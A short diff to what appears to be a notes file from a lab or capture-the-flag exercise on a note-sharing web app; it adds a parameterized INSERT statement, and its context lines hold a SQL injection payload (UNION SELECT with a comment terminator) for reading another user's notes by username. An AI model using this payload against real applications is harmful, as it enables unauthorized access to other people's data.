@@ -15,3 +15,6 @@ Take the first note from someone else by username by importing.
 
 Take a specific note from someone else by importing.
     1 UNION SELECT * FROM notes WHERE assocUser=(SELECT id FROM users WHERE username='bernardo') AND rownum = 2-- -
+
+
+INSERT INTO notes(id,assocUser,dateWritten,note,publicID) VALUES(null,?,?,?,?);
